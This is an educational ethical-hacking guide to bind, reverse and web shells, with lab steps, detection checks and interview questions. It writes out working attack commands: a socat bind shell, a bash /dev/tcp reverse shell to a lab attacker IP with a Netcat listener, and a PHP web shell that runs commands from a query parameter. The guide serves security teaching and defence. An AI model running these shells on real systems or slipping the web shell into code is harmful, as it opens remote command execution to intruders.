# Shells in Cybersecurity – Ethical Hacking Notes

## 1. What is a Shell?

A shell is a program that allows users to interact with an operating system through commands.

In penetration testing, attackers may obtain shell access to execute commands on a target machine.

Common shell types:

1. Bind Shell
2. Reverse Shell
3. Web Shell

---

# 2. Bind Shell

## What is a Bind Shell?

A Bind Shell is a technique where the target machine opens a port and waits for an incoming connection from the attacker.

**Remember:** Target listens, attacker connects.

## How does it work?

1. Attacker identifies a vulnerable target.
2. A shell process is attached to a listening port on the target.
3. Target waits for incoming connections.
4. Attacker connects to the target's IP and port.
5. Attacker receives shell access.

## Architecture

```text
ATTACKER (Kali Linux)
IP: 192.168.1.10
        |
        | Connect to port 4444
        |
        v
TARGET (Linux)
IP: 192.168.1.20
Port: 4444
        |
        v
    /bin/bash
        |
        v
   Shell Access
```

## Practical Lab

**Target machine:** Start a bind-shell listener using Socat:

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

**Attacker machine:** Connect to the target:

```bash
nc 192.168.1.20 4444
```

Test commands:

```bash
whoami
hostname
id
pwd
```

The commands execute on the target machine.

Note: Both machines must have network connectivity, and the target's firewall must permit the incoming connection. Run only in an authorized lab.

## How to identify a Bind Shell?

Check whether a suspicious port is open:

```bash
nmap -p 4444 192.168.1.20
```

Check listening ports on Linux:

```bash
ss -tulnp
```

---

# 3. Reverse Shell

## What is a Reverse Shell?

A Reverse Shell is a technique where the target machine initiates an outgoing connection to the attacker's machine.

The attacker waits for the connection and receives shell access.

**Remember:** Attacker listens, target connects.

## How does it work?

1. Attacker starts a listener on a specific port.
2. Target executes a reverse-shell payload.
3. Target initiates an outgoing connection.
4. Connection reaches the attacker's machine.
5. Attacker receives an interactive shell.

## Architecture

```text
ATTACKER (Kali Linux)
IP: 192.168.1.10
Port: 4444
        |
        | Waiting for connection
        |
        ^
        | Outgoing connection
        |
TARGET (Linux)
IP: 192.168.1.20
        |
        v
    /bin/bash
        |
        v
   Shell Access
```

## Practical Lab

### Step 1: Start a listener on the attacker machine

```bash
nc -lvnp 4444
```

Meaning:

- `nc` = Netcat
- `-l` = Listen
- `-v` = Verbose
- `-n` = No DNS resolution
- `-p` = Specify port
- `4444` = Listening port

### Step 2: Execute on the target machine

In an isolated, authorized Linux lab:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1'
```

Replace `192.168.1.10` with the attacker's IP address.

### Step 3: Verify shell access

On the attacker's terminal:

```bash
whoami
hostname
id
pwd
```

These commands execute on the target machine.

Note: The target must be able to reach the attacker's listening port. Firewall and NAT rules can affect connectivity.

## Why do attackers use Reverse Shells?

- Target initiates the connection.
- Can work when incoming connections to the target are restricted.
- Provides interactive command execution.
- Can use commonly permitted outbound ports, depending on network controls.

## How to identify Reverse Shells?

Check active connections:

```bash
ss -antp
```

Check running processes:

```bash
ps aux
```

Look for unusual processes making unexpected network connections.

---

# 4. Web Shell

## What is a Web Shell?

A Web Shell is a server-side script that allows someone to execute operating-system commands through HTTP requests.

It is commonly associated with compromised web servers.

**Remember:** Attacker sends an HTTP request, and the web server executes the requested command.

## How does it work?

1. Attacker discovers a vulnerable file-upload feature.
2. Attacker uploads a server-side script.
3. The script is stored in a web-accessible directory.
4. Attacker accesses the script through a browser.
5. The script executes commands on the web server.
6. Command output is returned through the HTTP response.

## Architecture

```text
ATTACKER
Browser
    |
    | HTTP Request
    v
WEB SERVER
    |
    v
Web Shell (PHP)
    |
    v
Operating System
    |
    v
Command Execution
    |
    v
HTTP Response
    |
    v
ATTACKER
```

## Practical Lab

Create a PHP file:

```bash
nano shell.php
```

Add this PHP code:

```php
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

Save the file.

### Step 1: Start a local PHP server

```bash
php -S 127.0.0.1:8000
```

### Step 2: Access the web shell

Open:

```text
http://127.0.0.1:8000/shell.php?cmd=whoami
```

Try these commands:

```text
?cmd=hostname
?cmd=id
?cmd=pwd
?cmd=uname -a
```

The PHP script executes these commands on the machine running the PHP server.

**Security note:** This is an intentionally vulnerable demonstration. Never expose this script to a public network or deploy it on a production server. Delete it after testing.

## How to identify Web Shells?

Look for:

- Unexpected PHP, ASPX or JSP files.
- Suspicious uploaded files.
- Unusual HTTP requests containing command parameters.
- Web-server processes executing operating-system commands.
- Unexpected modifications in web directories.

---

# 5. Difference Between Bind Shell, Reverse Shell and Web Shell

| Feature | Bind Shell | Reverse Shell | Web Shell |
|---|---|---|---|
| Connection | Incoming | Outgoing | HTTP/HTTPS |
| Target | Listens | Connects | Executes requests |
| Attacker | Connects | Listens | Sends HTTP requests |
| Interface | Terminal | Terminal | Browser or HTTP client |
| Access | Shell | Shell | Command execution |
| Common protocol | TCP | TCP | HTTP/HTTPS |

---

# 6. How These Shells Are Used Together

An attacker may use multiple shell techniques during a compromise.

Example attack scenario:

1. Attacker discovers a vulnerable web application.
2. Attacker uploads a Web Shell.
3. Attacker executes commands through HTTP requests.
4. Attacker uses the compromised server to establish a Reverse Shell.
5. Attacker receives an interactive terminal session.

This is one possible attack chain. These techniques can also be used independently.

---

# 7. Important Commands Cheat Sheet

| Command | Purpose |
|---|---|
| `nc -lvnp 4444` | Start a Netcat listener |
| `nc IP PORT` | Connect to a TCP listener |
| `socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash` | Create a bind shell in a lab |
| `ss -tulnp` | View listening ports |
| `ss -antp` | View TCP connections |
| `ps aux` | View running processes |
| `whoami` | Identify current user |
| `id` | View user and group information |
| `hostname` | Display machine hostname |
| `pwd` | Display current directory |
| `nmap -p 4444 IP` | Check a specific port |

---

# 8. VAPT Perspective: What Should You Check?

### Bind Shell
- Identify unexpected listening ports.
- Investigate suspicious processes attached to network ports.
- Check firewall rules.

### Reverse Shell
- Investigate unusual outbound connections.
- Check suspicious shell processes.
- Correlate process execution with network activity.

### Web Shell
- Review file-upload functionality.
- Check server-side file execution permissions.
- Investigate unexpected scripts in web directories.
- Review HTTP access logs and application logs.

---

# 9. Quick Revision

| Shell | Remember |
|---|---|
| Bind Shell | Target waits; attacker connects. |
| Reverse Shell | Attacker waits; target connects. |
| Web Shell | Commands are executed through web requests. |

### Interview Questions

**Q1. What is a Bind Shell?**

A shell where the target listens on a port and waits for an incoming connection.

**Q2. What is a Reverse Shell?**

A shell where the target initiates an outgoing connection to the attacker's machine.

**Q3. What is a Web Shell?**

A server-side script that allows command execution through HTTP requests.

**Q4. Which machine initiates the connection in a Reverse Shell?**

The target machine.

**Q5. Why is a Reverse Shell useful?**

It can establish access when inbound connections to the target are restricted.

**Q6. What is the difference between a Web Shell and a Reverse Shell?**

A Web Shell uses web requests to execute commands, while a Reverse Shell provides shell access through a connection initiated by the target.

**Q7. Does an open port automatically mean a Bind Shell exists?**

No. An open port only indicates that a service is listening. Further investigation is required to identify the service.

---

## Final Learning Order

1. Understand Linux Shell.
2. Learn Netcat.
3. Understand Bind Shell.
4. Understand Reverse Shell.
5. Learn Web Shell.
6. Practice shell enumeration and stabilization.
7. Learn detection and prevention.
